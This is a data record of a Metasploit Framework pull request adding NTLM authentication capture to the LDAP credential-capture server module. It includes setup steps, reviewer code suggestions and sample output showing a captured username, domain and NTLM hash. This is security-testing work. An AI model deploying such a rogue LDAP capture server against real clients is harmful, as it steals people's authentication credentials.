'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': '05d6e9815d25c0b5249377a1694f6fd44ee7829b', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}]",Nishant Desai,97749978,justanda7@gmail.com,User,,20,,7,9
1518431556,NTLM support for the LDAP capture capabilities,"This PR is a follow up to #18125

This PR aims to increase the scope of capturing authentication details from LDAP clients by supporting NTLM Authentication.

## Verification

List the steps needed to make sure this thing works

- [ ] Start `msfconsole`
- [ ] `use auxiliary/server/capture/ldap`
- [ ] Set the `SRVHOST`,`SRVPORT` if required.
- [ ] Change the `CHALLENGE` to another value if necessary
- [ ] **Verify** the working of the feature using NTLM Authentication.
- [ ] **Verify** that the credentials are stored in the database appropriately


### Note Points

- This was observed on Metasploit v6.2.
- Additional testing is required to ensure the handling of various cases of Authentication. (Would like some suggestions on testing)
",True,18376,https://api.github.com/repos/rapid7/metasploit-framework/pulls/18376,https://github.com/rapid7/metasploit-framework/pull/18376,closed,925,261,6,9,5,29,2,1,"[{'name': 'rn-enhancement'}, {'name': 'GSoC'}]",2023-09-17 08:44:01+00:00,2024-01-07 19:01:02+00:00,9713821.0,"112 days, 10:17:01","[{'comment_id': 1328117073, 'comment_body': ""```suggestion\r\n        OptAddress.new('SRVHOST', [ true, 'The ip address to listen on.', '0.0.0.0' ]),\r\n```"", 'comment_created': datetime.datetime(2023, 9, 17, 16, 53, 13, tzinfo=datetime.timezone.utc), 'commenter': 'jvoisin', 'type': 'User'}, {'comment_id': 1328117118, 'comment_body': ""```suggestion\r\n        OptPort.new('SRVPORT', [ true, 'The port to listen on.', '389' ]),\r\n```"", 'comment_created': datetime.datetime(2023, 9, 17, 16, 53, 27, tzinfo=datetime.timezone.utc), 'commenter': 'jvoisin', 'type': 'User'}, {'comment_id': 1328117427, 'comment_body': '```suggestion\r\n                    state[client][:user], state[client][:domain] = pub_info\r\n```', 'comment_created': datetime.datetime(2023, 9, 17, 16, 56, 2, tzinfo=datetime.timezone.utc), 'commenter': 'jvoisin', 'type': 'User'}, {'comment_id': 1328117518, 'comment_body': '```suggestion\r\n                  if pub_info.length == 2\r\n```', 'comment_created': datetime.datetime(2023, 9, 17, 16, 56, 47, tzinfo=datetime.timezone.utc), 'commenter': 'jvoisin', 'type': 'User'}, {'comment_id': 1328117566, 'comment_body': '```suggestion\r\n                    state[client][:user], state[client][:domain] = pub_info\r\n```', 'comment_created': datetime.datetime(2023, 9, 17, 16, 57, 15, tzinfo=datetime.timezone.utc), 'commenter': 'jvoisin', 'type': 'User'}, {'comment_id': 1328117588, 'comment_body': '```suggestion\r\n                  if pub_info.length == 2\r\n```', 'comment_created': datetime.datetime(2023, 9, 17, 16, 57, 22, tzinfo=datetime.timezone.utc), 'commenter': 'jvoisin', 'type': 'User'}, {'comment_id': 1328117662, 'comment_body': ""```suggestion\r\n                    server = datastore['Server'] # parse the domain and everything from the received type 1 \r\n```"", 'comment_created': datetime.datetime(2023, 9, 17, 16, 57, 51, tzinfo=datetime.timezone.utc), 'commenter': 'jvoisin', 'type': 'User'}, {'comment_id': 1333083967, 'comment_body': 'Can we namespace these a bit better by moving them into the class?', 'comment_created': datetime.datetime(2023, 9, 21, 13, 44, 43, tzinfo=datetime.timezone.utc), 'commenter': 'dwelch-r7', 'type': 'User'}, {'comment_id': 1334418394, 'comment_body': 'When refactoring to move default auth parsing into a library or utility class things like `status` should be handled using loggers or by some sort of reporting object returned as part of the result.', 'comment_created': datetime.datetime(2023, 9, 22, 13, 56, 12, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1334421133, 'comment_body': 'During refactor these methods should end up in helper classes and documented with Yard docs.', 'comment_created': datetime.datetime(2023, 9, 22, 13, 57, 55, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350484693, 'comment_body': 'Having defaults in the signature does not ensure the values are not passed as `nil` this constructor should validate the provided values.\r\n\r\nBased on the current method signature this would be a valid call:\r\n``` Ruby\r\nRex::Proto::LDAP::Auth.new(nil, nil, nil, nil, nil)\r\n```', 'comment_created': datetime.datetime(2023, 10, 9, 15, 53, 58, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350491551, 'comment_body': 'The message processing should not replace the instance values, hold the parsed values if found and fallback to the `Auth` instance variables when the message does not contain them.\r\n\r\nAlso based on other comments if the method accepts a `Net::NTLM::Message::Type1` argument it gets simpler to access the values: \r\n```suggestion\r\n          dom = message.domain\r\n          ws = message.workstation\r\n          dom = @domain unless dom.empty?\r\n          ws = @server unless ws\r\n          server_hash = MESSAGE.process_type1_message(message.encode64, @challenge, dom, ws, @dnsname, @dnsdomain)\r\n```\r\n\r\nOne side effect of this change would be that based on the NTLM message type, the domain and workstation default mean that the parsed values would not be `nil`, however the `parse_type1_domain` method is also possible to remove based on this suggestion.', 'comment_created': datetime.datetime(2023, 10, 9, 15, 58, 54, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350507588, 'comment_body': 'Utilize the NTLM class more effectively:\r\n```suggestion\r\n            message = Net::NTLM::Message.parse(user_login.authentication[1])\r\n\r\n            if message.is_a?(::Net::NTLM::Message::Type1)\r\n              auth_info[:server_creds] = generate_type2_response(message)\r\n              auth_info[:result_code] = Net::LDAP::ResultCodeSaslBindInProgress\r\n            elsif message.is_a?(::Net::NTLM::Message::Type3)\r\n              auth_info = handle_type3_message(message, auth_info)\r\n              auth_info[:result_code] = Net::LDAP::ResultCodeAuthMethodNotSupported\r\n            end\r\n```', 'comment_created': datetime.datetime(2023, 10, 9, 16, 12, 12, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350511408, 'comment_body': 'Require a typed message here:\r\n```suggestion\r\n        # @param message [Net::NTLM::Message::Type1] NTLM Type1 message\r\n```', 'comment_created': datetime.datetime(2023, 10, 9, 16, 15, 36, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350518807, 'comment_body': '```suggestion\r\n        # @param message [Net::NTLM::Message::Type1] NTLM Type3 message\r\n```', 'comment_created': datetime.datetime(2023, 10, 9, 16, 22, 2, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350540483, 'comment_body': 'It looks like there is some additional type checks here to set in the arg hash and some error checks, however:\r\n\r\n```suggestion\r\n          arg = {\r\n           domain: message.domain,\r\n           user: message.user,\r\n           host: message.workstation,\r\n           lm_hash: message.lm_response,\r\n           ntlm_hash: message.ntlm_response,\r\n           ntlm_ver: message.ntlm_version\r\n         }\r\n```\r\n\r\nBased on this refactor suggestion, I suspect the `process_ntlm_hash` method may also be simplified or removed base on reusing methods available from `Net::NTLM::Message::Type3` from the [`RubyNTLM` package](https://www.rubydoc.info/gems/rubyntlm/0.5.0/Net/NTLM/Message/Type3).', 'comment_created': datetime.datetime(2023, 10, 9, 16, 40, 32, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350556232, 'comment_body': 'Check the type on `auth_provider`, might be even better to raise an `ArgumentError` when value is not nil and not of type `Rex::Proto::LDAP::Auth`.', 'comment_created': datetime.datetime(2023, 10, 9, 16, 54, 37, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350558210, 'comment_body': 'This value seems redundant since `ip` and `port` are in this hash.  It looks to be used as a convenience value for printed messages and only once in this class.', 'comment_created': datetime.datetime(2023, 10, 9, 16, 56, 20, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350566918, 'comment_body': '`auth_info[:name]` does not look to be set when this code is reached. These are edge cases so adding `rspec` should further detail this.', 'comment_created': datetime.datetime(2023, 10, 9, 17, 3, 58, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350567037, 'comment_body': '`auth_info[:name]` does not look to be set when this code is reached.', 'comment_created': datetime.datetime(2023, 10, 9, 17, 4, 5, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1350567218, 'comment_body': '`auth_info[:name]` does not look to be set when this code is reached.', 'comment_created': datetime.datetime(2023, 10, 9, 17, 4, 14, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1377601708, 'comment_body': 'The conditional here is for what auth methods are supported so the error response should reflect the lack of support.\r\n\r\n```suggestion\r\n            auth_info[:result_code] = Net::LDAP::ResultCodeAuthMethodNotSupported \r\n```', 'comment_created': datetime.datetime(2023, 10, 31, 13, 38, 23, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1439477705, 'comment_body': 'This test is very strict, consider:\r\n\r\n```suggestion\r\n          elsif sasl?(user_login)\r\n```\r\n\r\nand adding a private method:\r\n``` ruby\r\nSUPPORTS_SASL = %w[GSS-SPNEGO NTLM]\r\n\r\n#\r\n# Determine if the supplied request is formatted for SASL auth\r\n#\r\n# @param user_login [OpenStruct] User login information\r\ndef sasl?(user_login)\r\n  user_login.authentication.is_a?(Array) && SUPPORTS_SASL.include?(user_login.authentication[0])\r\nend\r\n```\r\n\r\nldapsearch offers `NTLM` in `authentication[0]` when attempting to auth with `NTLMSSP`.', 'comment_created': datetime.datetime(2024, 1, 2, 14, 3, 28, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1439479471, 'comment_body': 'previously noted this should not override instance values with each auth request:\r\n\r\n```suggestion\r\n          domain = dom.empty? ? @domain : dom\r\n          server = ws.empty? ? @server : ws\r\n          server_hash = MESSAGE.process_type1_message(message.encode64, @challenge, domain, server, @dnsname, @dnsdomain)\r\n```', 'comment_created': datetime.datetime(2024, 1, 2, 14, 5, 28, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1439489110, 'comment_body': 'Noticed during testing, the result message here for `ResultCodeSaslBindInProgress` is not the message returned by an OpenLDAP server. \r\n\r\n""SASL(0): successful result: "" is returned by OpenLDAP. See screenshot:\r\n\r\n![Screenshot 2024-01-02 at 8 14 21\u202fAM](https://github.com/rapid7/metasploit-framework/assets/7873740/1e40036f-8627-4e73-ba92-8d531f666cd5)\r\n\r\nWhere this code returns `saslBindInProgress`\r\n', 'comment_created': datetime.datetime(2024, 1, 2, 14, 17, 12, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1439493248, 'comment_body': ""Could this be generated instead of hard coded?\r\n\r\n```suggestion\r\n    ntlm1 = Net::NTLM::Message::Type1.new.serialize\r\n\r\n    sasl = ['GSS-SPNEGO'.to_ber, ntlm1.to_ber].to_ber_contextspecific(3)\r\n    br = [\r\n      Net::LDAP::Connection::LdapVersion.to_ber, ''.to_ber, sasl\r\n    ].to_ber_appsequence(Net::LDAP::PDU::BindRequest)\r\n\r\n    type1 = [0.to_ber, br, nil].compact.to_ber_sequence.read_ber(Net::LDAP::AsnSyntax)\r\n```"", 'comment_created': datetime.datetime(2024, 1, 2, 14, 21, 57, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1439686020, 'comment_body': 'Identified in testing the `post_pdu` flag here is set when result data is available for processing.\r\n\r\n```suggestion\r\n      if processed_data[:post_pdu]\r\n```\r\n', 'comment_created': datetime.datetime(2024, 1, 2, 17, 58, 46, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1439728441, 'comment_body': ""Extra context data should not be wrapped in an Array object.  With this additional adjustment NTLM auth can succeed.\r\n```suggestion\r\n            tag_sequence << context_data.to_ber_contextspecific(context_code)\r\n```\r\n\r\nFrom client side after change:\r\n```\r\n$ ldapsearch -H ldap://server.example.com -Y ntlm -U admin -b 'dc=server,dc=example,dc=com'\r\nSASL/NTLM authentication started\r\nPlease enter your password:\r\nldap_sasl_interactive_bind: Can't contact LDAP server (-1)\r\n        additional info: saslBindInProgress\r\n```\r\n\r\nWith change and all others from previous comments to support `NTLM` as mechanism referenced:\r\n```\r\nmsf6 auxiliary(server/capture/ldap) > run\r\n\r\n[*] Server started.\r\n[+] LDAP Login Attempt => From:127.0.0.1:58642   Username:admin  ntlm_hash::e1636396de9664cd2ff248fa8f561615747fb96d869af536     Domain:EXAMPLE\r\n```"", 'comment_created': datetime.datetime(2024, 1, 2, 18, 57, 19, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}, {'comment_id': 1444054189, 'comment_body': 'Just a note, this option is not `used` by the implementation. \r\n\r\nLooking at where it came from, I suspect this is [from intention to mimic `http_nltm` behavior](https://github.com/rapid7/metasploit-framework/blob/ee3b8b40b690f6209cd3d8797eb26799e6e07565/modules/auxiliary/server/capture/http_ntlm.rb#L124-L132).  For now I will just remove this options during land of this PR.', 'comment_created': datetime.datetime(2024, 1, 7, 18, 49, 20, tzinfo=datetime.timezone.utc), 'commenter': 'jmartin-tech', 'type': 'User'}]","[{'commit_sha': '6972a910fbab28c137690062ddca5f3a3a36b4d6', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': '1a3b00e593a63aaded9984e0c39315836cc3f83e', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': 'ea189d6c34897f8fd1f3d56ae29dffaa182f9053', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': '7876912eab45c684473f278973915decafc8fca6', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': '70c69f46a5d394473e1daeaaecf285edcb8b5920', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': '672d651221d5384579ae8f9cc8a3f127f0680219', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': '6ba5d03993140855beeac9f3ffc2409395430855', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}, {'commit_sha': '2ab1b7a31022aada5b88525af3baeab462901dc4', 'committer_username': 'jmartin-tech', 'committer_name': 'Jeffrey Martin', 'committer_email': None, 'commit_date': datetime.datetime(2014, 6, 12, 19, 1, 5, tzinfo=datetime.timezone.utc)}, {'commit_sha': 'a09cf6471a4c1a655841c50444fd54ea8a045749', 'committer_username': 'JustAnda7', 'committer_name': 'Nishant Desai', 'committer_email': 'justanda7@gmail.com', 'commit_date': datetime.datetime(2022, 1, 14, 16, 6, 45, tzinfo=datetime.timezone.utc)}]",Nishant Desai,97749978,justanda7@gmail.com,User,,20,,7,9

Project_ID,Name,Full_name,Language,Forks,Stars,Watchers,contributors,commits,issues,branches,PRs_count,contributor pullrequests
2293158,metasploit-framework,rapid7/metasploit-framework,Ruby,13841,33590,2052,1541,74538,443,15,38,"[{'id': 1518431556, 'number': 18376, 'closed': datetime.datetime(2024, 1, 7, 19, 1, 2, tzinfo=datetime.timezone.utc), 'created': datetime.datetime(2023, 9, 17, 8, 44, 1, tzinfo=datetime.timezone.utc), 'time_taken': 9713821.0, 'time_delta': '112 days, 10:17:01', 'additions': 925, 'deletions': 261, 'state': 'closed'}, {'id': 1398388827, 'number': 18125, 'closed': datetime.datetime(2023, 9, 1, 16, 10, 47, tzinfo=datetime.timezone.utc), 'created': datetime.datetime(2023, 6, 19, 14, 55, 18, tzinfo=datetime.timezone.utc), 'time_taken': 6398129.0, 'time_delta': '74 days, 1:15:29', 'additions': 327, 'deletions': 0, 'state': 'closed'}, {'id': 1230251113, 'number': 17601, 'closed': None, 'created': datetime.datetime(2023, 2, 6, 11, 7, 26, tzinfo=datetime.timezone.utc), 'time_taken': 0.0, 'time_delta': '', 'additions': 158, 'deletions': 10, 'state': 'open'}, {'id': 1220524150, 'number': 17566, 'closed': datetime.datetime(2023, 2, 6, 16, 46, 28, tzinfo=datetime.timezone.utc), 'created': datetime.datetime(2023, 1, 29, 7, 27, 24, tzinfo=datetime.timezone.utc), 'time_taken': 724744.0, 'time_delta': '8 days, 9:19:04', 'additions': 113, 'deletions': 30, 'state': 'closed'}, {'id': 1129826638, 'number': 17288, 'closed': datetime.datetime(2022, 11, 22, 14, 1, 58, tzinfo=datetime.timezone.utc), 'created': datetime.datetime(2022, 11, 21, 10, 26, 13, tzinfo=datetime.timezone.utc), 'time_taken': 99345.0, 'time_delta': '1 day, 3:35:45', 'additions': 15, 'deletions': 0, 'state': 'closed'}, {'id': 1119905017, 'number': 17255, 'closed': datetime.datetime(2022, 12, 8, 19, 26, 10, tzinfo=datetime.timezone.utc), 'created': datetime.datetime(2022, 11, 12, 10, 24, 12, tzinfo=datetime.timezone.utc), 'time_taken': 2278918.0, 'time_delta': '26 days, 9:01:58', 'additions': 1093, 'deletions': 837, 'state': 'closed'}, {'id': 1111886965, 'number': 17232, 'closed': datetime.datetime(2022, 11, 12, 7, 59, 14, tzinfo=datetime.timezone.utc), 'created': datetime.datetime(2022, 11, 6, 7, 29, 6, tzinfo=datetime.timezone.utc), 'time_taken': 520208.0, 'time_delta': '6 days, 0:30:08', 'additions': 11955, 'deletions': 1631, 'state': 'closed'}, {'id': 1079966724, 'number': 17118, 'closed': datetime.datetime(2022, 10, 7, 18, 53, 37, tzinfo=datetime.timezone.utc), 'created': datetime.datetime(2022, 10, 7, 7, 11, 50, tzinfo=datetime.timezone.utc), 'time_taken': 42107.0, 'time_delta': '11:41:47', 'additions': 5, 'deletions': 5, 'state': 'closed'}]"
18418533,metasploit-payloads,rapid7/metasploit-payloads,C,663,1700,206,124,3468,74,6,9,"[{'id': 1254173468, 'number': 614, 'closed': datetime.datetime(2023, 2, 28, 15, 24, 47, tzinfo=datetime.timezone.utc), 'created': datetime.datetime(2023, 2, 25, 11, 3, 29, tzinfo=datetime.timezone.utc), 'time_taken': 274878.0, 'time_delta': '3 days, 4:21:18', 'additions': 117, 'deletions': 19, 'state': 'closed'}]"
